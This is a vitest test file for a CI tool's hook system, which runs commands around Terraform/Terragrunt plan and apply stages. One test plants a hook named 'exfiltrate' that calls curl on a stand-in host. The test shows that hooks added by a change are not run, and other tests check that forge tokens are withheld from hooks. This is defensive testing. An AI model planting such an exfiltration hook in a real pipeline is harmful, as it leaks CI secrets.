import { chmodSync, existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import type { OpWaveHooks } from "@intentius/chant/op";
import { applyWave, parseLedger } from "../src/apply";
import { ConfigError, STEPS_MOVED, validateConfig } from "../src/config";
import { init as initRepo } from "../src/init";
import { hookName, hookProblems, hooksAt, readHooks, runHooks, runUnitHooks } from "../src/hooks";
import { renderNote } from "../src/report/views";
import { runStage } from "../src/report/stage";
import { git, tmp, write } from "./helpers";

// Hours from the start of the run: chant stamps the pending facts it records with the time it runs, so an approval at T(h) is newer than any of them.
const T0 = Date.now();
const T = (h: number): string => new Date(T0 + h * 3600_000).toISOString();

/** chant.workspace.json with these ci.hooks. */
const decl = (hooks?: OpWaveHooks): string => `${JSON.stringify({ name: "t", schema: 1, minReader: "0.102.0", members: [], ...(hooks ? { ci: { hooks } } : {}) }, null, 2)}\n`;
const sh = (run: string): string[] => ["sh", "-c", run];

const problems = (raw: unknown): string[] => {
  try {
    validateConfig(raw, "terragucci.yml");
    return [];
  } catch (e) {
    return (e as ConfigError).problems ?? [(e as Error).message];
  }
};

describe("ci.hooks in chant.workspace.json", () => {
  it("terragucci.yml takes no steps, and says where they went", () => {
    expect(problems({ steps: [{ run: "./check.sh", before: "plan" }] })).toEqual([`config.steps: ${STEPS_MOVED}`]);
    expect(problems({ image: "registry.example.com/infra/tg:1" })).toEqual([]);
  });

  it("refuses a hook without perRun: terragucci runs each hook for each root", () => {
    expect(hookProblems({ "before-plan": [{ name: "lint", command: ["./lint"] }, { command: ["./ok"], perRun: true }] })).toEqual([
      "ci.hooks before-plan lint: terragucci runs a hook for each root it matches, in that root's directory, so set perRun: true",
    ]);
  });

  it("selects a moment's hooks by target, in the declaration's order, and names a hook by its command when it has no name", () => {
    const hooks = { "before-plan": [{ command: ["a"], perRun: true, targets: ["prod/*"] }, { command: ["b"], perRun: true }], "after-plan": [{ command: ["c"], perRun: true }] };
    expect(hooksAt(hooks, "before-plan", "prod/app").map((h) => h.command[0])).toEqual(["a", "b"]);
    expect(hooksAt(hooks, "before-plan", "dev/app").map((h) => h.command[0])).toEqual(["b"]);
    expect(hooksAt(hooks, "after-plan", "dev/app").map((h) => h.command[0])).toEqual(["c"]);
    expect(hookName({ command: ["echo", "hi"] })).toBe("echo hi");
    expect(hookName({ name: "verify", command: ["x"] })).toBe("verify");
  });
});

describe("runHooks", () => {
  it("runs a hook in the root's directory with the stage's variables and no forge token", async () => {
    const repo = write(tmp(), { "app/main.tf": "" });
    const lines: string[] = [];
    const env = { PATH: process.env.PATH, TG_TOKEN: "tok-1", GITHUB_TOKEN: "gh-1", FOO: "bar" };
    const hooks = { "after-plan": [{ name: "see", command: sh("pwd > seen; env | sort >> seen; echo hello {target}"), perRun: true }] };
    const out = await runHooks(hooks, "after-plan", { repo, root: "app", stage: "tf-plan", env, planFile: "/tmp/p", log: (l) => lines.push(l) });
    expect(out).toEqual({ runs: [expect.objectContaining({ name: "see", when: "after-plan", status: "passed", exit: 0 })], holds: [] });
    const seen = readFileSync(join(repo, "app", "seen"), "utf-8");
    expect(seen.split("\n")[0]).toMatch(/\/app$/);
    expect(seen).toMatch(/^TG_STAGE=tf-plan$/m);
    expect(seen).toMatch(/^CHANT_HOOK=after-plan$/m);
    expect(seen).toMatch(/^CHANT_TARGET=app$/m);
    expect(seen).toMatch(/^TG_ROOT=app$/m);
    expect(seen).toMatch(/^TG_PLAN_FILE=\/tmp\/p$/m);
    expect(seen).toMatch(/^CHANT_PLAN=\/tmp\/p$/m);
    expect(seen).toMatch(/^FOO=bar$/m);
    expect(seen).not.toContain("tok-1");
    expect(seen).not.toContain("gh-1");
    expect(lines).toContain("app: after-plan see: hello app");
  });

  it("a failed hook fails the root and stops the hooks after it; an approve hook holds the wave and the rest still run", async () => {
    const repo = write(tmp(), { "app/main.tf": "" });
    const ctx = { repo, root: "app", stage: "tf-apply" as const, env: { PATH: process.env.PATH }, log: () => {} };
    const failed = await runHooks({ "before-plan": [{ name: "bad", command: sh("echo bad >&2; exit 7"), perRun: true }, { command: sh("touch never"), perRun: true }] }, "before-plan", ctx);
    expect(failed.error).toBe("hook before-plan bad failed with exit 7:\nbad");
    expect(failed.runs.map((r) => r.status)).toEqual(["failed"]);
    expect(existsSync(join(repo, "app", "never"))).toBe(false);
    const held = await runHooks({ "before-plan": [{ name: "verify", command: sh("exit 1"), perRun: true, onFailure: "approve" }, { command: sh("touch after"), perRun: true }] }, "before-plan", ctx);
    expect(held.error).toBeUndefined();
    expect(held.holds).toEqual(["verify"]);
    expect(held.runs.map((r) => r.status)).toEqual(["approval", "passed"]);
    expect(existsSync(join(repo, "app", "after"))).toBe(true);
  });

  it("a hook that cannot start fails the root with no exit code, and the job's own CHANT_HOOK does not reach a hook", async () => {
    const repo = write(tmp(), { "app/main.tf": "" });
    const ctx = { repo, root: "app", stage: "tf-plan" as const, env: { PATH: process.env.PATH, CHANT_HOOK: "stale" }, log: () => {} };
    const missing = await runHooks({ "before-plan": [{ name: "gone", command: ["./no-such-hook"], perRun: true }] }, "before-plan", ctx);
    expect(missing.runs).toEqual([expect.objectContaining({ name: "gone", status: "failed", exit: null })]);
    expect(missing.error).toMatch(/^hook before-plan gone failed with exit none/);
    await runHooks({ "after-plan": [{ command: sh("echo $CHANT_HOOK > moment"), perRun: true }] }, "after-plan", ctx);
    expect(readFileSync(join(repo, "app", "moment"), "utf-8").trim()).toBe("after-plan");
  });
});

describe("runHooks side by side", () => {
  it("two roots' hooks overlap, and each root's output lines stay together", async () => {
    const repo = write(tmp(), { "a/main.tf": "", "b/main.tf": "" });
    const lines: string[] = [];
    // Each hook marks its start, then waits for the other root's start mark: they pass only when both run at once.
    const hooks = { "before-plan": [{ name: "meet", command: sh("touch ../started-{target}; for i in $(seq 1 100); do ls ../started-* | grep -qv started-{target} && { echo met; echo done; exit 0; }; sleep 0.05; done; exit 9"), perRun: true }] };
    const ctx = (root: string) => ({ repo, root, stage: "tf-plan" as const, env: { PATH: process.env.PATH }, log: (l: string) => lines.push(l) });
    const [a, b] = await Promise.all([runHooks(hooks, "before-plan", ctx("a")), runHooks(hooks, "before-plan", ctx("b"))]);
    expect(a.runs.map((r) => r.status)).toEqual(["passed"]);
    expect(b.runs.map((r) => r.status)).toEqual(["passed"]);
    for (const root of ["a", "b"]) {
      const i = lines.indexOf(`${root}: before-plan meet: met`);
      expect(lines.slice(i, i + 3)).toEqual([`${root}: before-plan meet: met`, `${root}: before-plan meet: done`, `${root}: before-plan hook meet passed`]);
    }
  });
});

/** A repo whose main holds `base` and whose branch `change` holds `head` on top of it. */
function branched(base: Record<string, string>, head: Record<string, string>): { repo: string; baseSha: string } {
  const repo = tmp("tg-steps-");
  git(repo, "init", "-q", "-b", "main");
  write(repo, base);
  git(repo, "add", "-A");
  git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "base");
  const baseSha = git(repo, "rev-parse", "HEAD").trim();
  git(repo, "checkout", "-q", "-b", "change");
  write(repo, head);
  git(repo, "add", "-A");
  git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "change");
  return { repo, baseSha };
}

describe("ci.hooks are read at base", () => {
  it("a change that adds, edits or removes a hook runs the base's hooks, not its own", () => {
    const verify = { name: "verify", command: ["./verify.sh"], perRun: true };
    const { repo, baseSha } = branched({ "chant.workspace.json": decl({ before: { plan: [verify] } }) }, { "chant.workspace.json": decl({ before: { apply: [{ name: "exfiltrate", command: ["curl", "evil"], perRun: true }] } }) });
    const read = readHooks(repo, baseSha);
    expect(read.hooks).toEqual({ "before-plan": [verify] });
    expect(read.from).toBe(baseSha);
    // No base (a drift run on the default branch): the checkout's own.
    expect(Object.keys(readHooks(repo, undefined).hooks)).toEqual(["before-apply"]);
  });

  it("a base it cannot read runs no hook when the checkout names none, and fails when it names some", () => {
    const { repo } = branched({ "chant.workspace.json": decl() }, {});
    const none = readHooks(repo, "origin/nowhere");
    expect(none.hooks).toEqual({});
    expect(none.note).toContain("this checkout names no hooks, so none run");
    write(repo, { "chant.workspace.json": decl({ before: { plan: [{ command: ["x"], perRun: true }] } }) });
    expect(() => readHooks(repo, "origin/nowhere")).toThrow(/ci.hooks are read from chant.workspace.json at origin\/nowhere.*so no hook can be trusted to run/);
  });
});

/** A fake tofu for tf-plan: the plan reads `step.txt` when a step wrote it, and fails without it. */
function planTofu(dir: string): string {
  const path = join(dir, "tofu");
  writeFileSync(path, `#!/bin/sh
chdir="\${1#-chdir=}"; shift
echo "$chdir $*" >> "${dir}/calls.log"
case "$1" in
  init) exit 0 ;;
  plan) [ -f "$chdir/step.txt" ] || { echo "no step.txt" >&2; exit 1; }; for a in "$@"; do case "$a" in -out=*) : > "\${a#-out=}" ;; esac; done; echo "Plan: 1 to add"; exit 0 ;;
  show) if [ "$2" = "-json" ]; then echo '{"format_version":"1.2","resource_changes":[{"address":"terraform_data.x","mode":"managed","type":"terraform_data","name":"x","change":{"actions":["create"],"before":null,"after":{"input":"1"},"after_unknown":{}}}]}'; else echo "plan text"; fi ;;
esac
`);
  chmodSync(path, 0o755);
  return path;
}

describe("tf-plan with ci.hooks", () => {
  const HOOKS = decl({ before: { plan: [{ name: "write", command: sh("echo from-hook > step.txt"), perRun: true }] } });

  it("a hook before the plan writes a file the plan reads, and the report and the note list it", { timeout: 60_000 }, async () => {
    const { repo } = branched({ "chant.workspace.json": HOOKS, "app/main.tf": 'terraform {\n  backend "local" {}\n}\n' }, { "app/extra.tf": "# change\n" });
    const bin = tmp();
    const result = await runStage("tf-plan", repo, { binary: planTofu(bin), base: "main", env: { PATH: process.env.PATH }, noCost: true, out: join(bin, "out") }, () => {});
    expect(result.failed).toBe(false);
    expect(result.report.roots[0].steps).toEqual([expect.objectContaining({ name: "write", when: "before-plan", status: "passed", exit: 0 })]);
    expect(renderNote(result.report)).toMatch(/\*\*Hooks \(1\):\*\*[\s\S]*\| .*app.* \| before-plan \| write \| passed \|/);
  });

  it("a hook the change adds does not run: the base has none, so the plan does without it", { timeout: 60_000 }, async () => {
    const { repo } = branched({ "chant.workspace.json": decl(), "app/main.tf": 'terraform {\n  backend "local" {}\n}\n' }, { "chant.workspace.json": HOOKS, "app/extra.tf": "# change\n" });
    const bin = tmp();
    const result = await runStage("tf-plan", repo, { binary: planTofu(bin), base: "main", env: { PATH: process.env.PATH }, noCost: true, out: join(bin, "out") }, () => {});
    expect(result.failed).toBe(true);
    expect(result.report.roots[0].steps).toBeUndefined();
    expect(result.report.roots[0].error).toContain("no step.txt");
  });

  it("a failed hook fails the root before its init; an approve hook marks its wave as waiting whatever the gate", { timeout: 60_000 }, async () => {
    const files = { "app/main.tf": 'terraform {\n  backend "local" {}\n}\n', "app/step.txt": "x" };
    const bin = tmp();
    const fail = branched({ ...files, "chant.workspace.json": decl({ before: { observe: [{ name: "stop", command: sh("exit 3"), perRun: true }] } }) }, { "app/extra.tf": "# change\n" });
    const r1 = await runStage("tf-plan", fail.repo, { binary: planTofu(bin), base: "main", env: { PATH: process.env.PATH }, noCost: true, out: join(bin, "out1") }, () => {});
    expect(r1.failed).toBe(true);
    expect(r1.report.roots[0].error).toContain("hook before-observe stop failed with exit 3");
    expect(existsSync(join(bin, "calls.log")) ? readFileSync(join(bin, "calls.log"), "utf-8") : "").not.toContain("init");

    const hold = branched({ ...files, "terragucci.yml": "gate: never\n", "chant.workspace.json": decl({ after: { plan: [{ name: "verify", command: sh("exit 1"), perRun: true, onFailure: "approve" }] } }) }, { "app/extra.tf": "# change\n" });
    const r2 = await runStage("tf-plan", hold.repo, { binary: planTofu(bin), base: "main", env: { PATH: process.env.PATH }, noCost: true, out: join(bin, "out2") }, () => {});
    expect(r2.failed).toBe(false);
    expect(r2.report.waves[0]).toMatchObject({ waits: true, held_by_steps: ["app"] });
    expect(r2.report.roots[0].why).toContain("hook verify asks for an approval");
    expect(renderNote(r2.report)).toContain("asks for an approval, exit 1");
    expect(renderNote(r2.report)).toMatch(/waits for an approval.*\(a hook of `app` asks for one\)/);
  });
});

/** A fake tofu for a wave: plan writes the root into the plan file, show -json prints $PLANS/<root>.json, apply logs the root. */
const FAKE = `#!/usr/bin/env bash
dir="\${1#-chdir=}"; root="$(basename "$dir")"
case "$2" in
  plan) for a in "$@"; do case "$a" in -out=*) echo "$root" > "\${a#-out=}" ;; esac; done; echo "Plan: 1 to add" ;;
  show) cat "$PLANS/$(cat "\${@: -1}").json" ;;
  apply) echo "applied $root" >> "$LOG"; echo "Apply complete! Resources: 1 added, 0 changed, 0 destroyed." ;;
esac
exit 0
`;

describe("a wave with ci.hooks", () => {
  afterEach(() => {
    vi.restoreAllMocks();
    vi.unstubAllEnvs();
  });

  /** A repo whose first commit holds `base` and whose second, the one applied, holds `head`. */
  function setup(base: Record<string, string>, head: Record<string, string> = {}): { work: string; origin: string; bin: string; log: string } {
    const dir = tmp("tg-hooks-wave-");
    const origin = join(dir, "origin.git");
    git(dir, "init", "-q", "--bare", origin);
    const work = join(dir, "work");
    mkdirSync(join(work, "a"), { recursive: true });
    git(work, "init", "-q", "-b", "main");
    write(work, base);
    git(work, "add", "-A");
    git(work, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "one");
    write(work, head);
    git(work, "add", "-A");
    git(work, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "two");
    git(work, "remote", "add", "origin", origin);
    git(work, "push", "-q", "origin", "main");
    const plans = join(dir, "plans");
    mkdirSync(plans);
    writeFileSync(join(plans, "a.json"), JSON.stringify({ resource_changes: [{ address: "terraform_data.x", mode: "managed", type: "terraform_data", name: "x", change: { actions: ["create"], before: null, after: { input: "1" }, after_unknown: {} } }] }));
    const bin = join(dir, "tofu");
    writeFileSync(bin, FAKE);
    chmodSync(bin, 0o755);
    vi.stubEnv("PLANS", plans);
    vi.stubEnv("LOG", join(dir, "apply.log"));
    return { work, origin, bin, log: join(dir, "apply.log") };
  }
  const opts = (bin: string) => ({ wave: 1, layers: [["a"]], binary: bin, gate: "never" as const, env: { ...process.env } });
  const echo = (moment: string) => [{ command: sh(`echo ${moment} >> "$TG_REPO/order"`), perRun: true }];

  it("runs the hooks around init, plan and apply, and a failed hook stops the wave before anything applies", async () => {
    const hooks = { before: { observe: echo("before-observe"), plan: echo("before-plan"), apply: echo("before-apply") }, after: { plan: echo("after-plan"), apply: echo("after-apply") } };
    const ok = setup({ "chant.workspace.json": decl(hooks) });
    vi.spyOn(console, "log").mockImplementation(() => {});
    expect(await applyWave(ok.work, opts(ok.bin))).toBe(0);
    const order = ["before-observe", "before-plan", "after-plan", "before-apply", "after-apply"];
    expect(readFileSync(join(ok.work, "order"), "utf-8").trim().split("\n")).toEqual(order);
    const report = JSON.parse(readFileSync(join(ok.work, "terragucci-report", "report.json"), "utf-8"));
    expect(report.roots[0].steps.map((s: { when: string }) => s.when)).toEqual(order);

    const bad = setup({ "chant.workspace.json": decl({ after: { plan: [{ command: sh("exit 1"), perRun: true }] } }) });
    expect(await applyWave(bad.work, opts(bad.bin))).toBe(1);
    expect(existsSync(bad.log)).toBe(false);
  });

  it("reads the hooks at the applied commit's first parent: a hook the applied commit adds does not run", async () => {
    const { work, bin, log } = setup({ "chant.workspace.json": decl() }, { "chant.workspace.json": decl({ before: { apply: [{ command: sh("exit 1"), perRun: true }] } }) });
    vi.spyOn(console, "log").mockImplementation(() => {});
    expect(await applyWave(work, opts(bin))).toBe(0);
    expect(readFileSync(log, "utf-8")).toContain("applied a");
  });

  it("an approve hook that fails holds the wave at its gate under gate: never, through the set digest's ledger", async () => {
    const { work, origin, bin, log } = setup({ "chant.workspace.json": decl({ before: { plan: [{ name: "verify", command: sh("exit 1"), perRun: true, onFailure: "approve" }] } }) });
    const out = vi.spyOn(console, "log").mockImplementation(() => {});
    expect(await applyWave(work, { ...opts(bin), now: T(1) })).toBe(3);
    expect(existsSync(log)).toBe(false);
    expect(out.mock.calls.flat().join("\n")).toContain("a: hook verify asks for an approval, so the gate holds this wave");
    const ledger = parseLedger(git(origin, "show", "chant/lifecycle:_gates/tf-apply.jsonl"));
    expect(ledger.pending).toHaveLength(1);
    const report = JSON.parse(readFileSync(join(work, "terragucci-report", "report.json"), "utf-8"));
    expect(report.waves[0]).toMatchObject({ approval: "waiting", held_by_steps: ["a"] });
    // An approval of the digest lets the wave apply.
    const digest = ledger.pending[0]!.planDigest!;
    const line = JSON.stringify({ version: 1, kind: "resolution", op: "tf-apply", gate: "wave-1", resolvedBy: "alice", timestamp: T(2), planDigest: digest });
    const clone = tmp("tg-approve-");
    git(clone, "clone", "-q", "-b", "chant/lifecycle", origin, ".");
    writeFileSync(join(clone, "_gates/tf-apply.jsonl"), readFileSync(join(clone, "_gates/tf-apply.jsonl"), "utf-8") + line + "\n");
    git(clone, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "approve");
    git(clone, "push", "-q", "origin", "chant/lifecycle");
    expect(await applyWave(work, { ...opts(bin), now: T(3) })).toBe(0);
    expect(readFileSync(log, "utf-8")).toContain("applied a");
  });
});

describe("init with image", () => {
  it("writes the image terragucci.yml names into every job", async () => {
    const repo = write(tmp(), { "app/main.tf": 'terraform {\n  backend "local" {}\n}\n', "terragucci.yml": "forge: github\nimage: registry.example.com/infra/tg:1\n" });
    const r = await initRepo(repo, { dryRun: true });
    const wf = r.files.find((f) => f.path.endsWith("terragucci.yml") && f.path.includes(".github"))!.content;
    expect(wf).toContain("# Every job runs in registry.example.com/infra/tg:1, the image terragucci.yml names.");
    expect(wf).not.toContain("ghcr.io/intentius/terragucci-");
  });
});

describe("hooks around a Terragrunt wave's run --all", () => {
  it("runs a moment once per unit its targets match, in the unit's directory, with the unit's saved plan", async () => {
    const repo = write(tmp(), { "live/a/terragrunt.hcl": "", "live/b/terragrunt.hcl": "", "other/c/terragrunt.hcl": "" });
    const lines: string[] = [];
    const hooks = {
      "after-plan": [
        { name: "where", command: sh('echo "$TG_ROOT $(basename "$PWD") $TG_PLAN_FILE"'), perRun: true, targets: ["live/*"] },
        { name: "held", command: sh("exit 2"), perRun: true, targets: ["live/b"], onFailure: "approve" as const },
      ],
    };
    const out = await runUnitHooks(hooks, "after-plan", ["live/a", "live/b", "other/c"], { repo, stage: "tf-apply", env: { PATH: process.env.PATH }, log: (l) => lines.push(l), planFile: (u) => `/plans/${u}/tfplan.tfplan` });
    expect([...out.keys()]).toEqual(["live/a", "live/b"]);
    expect(lines).toContain("live/a: after-plan where: live/a a /plans/live/a/tfplan.tfplan");
    expect(lines).toContain("live/b: after-plan where: live/b b /plans/live/b/tfplan.tfplan");
    expect(out.get("live/a")!.holds).toEqual([]);
    expect(out.get("live/b")!.holds).toEqual(["held"]);
    expect(out.get("live/b")!.error).toBeUndefined();
  });
});
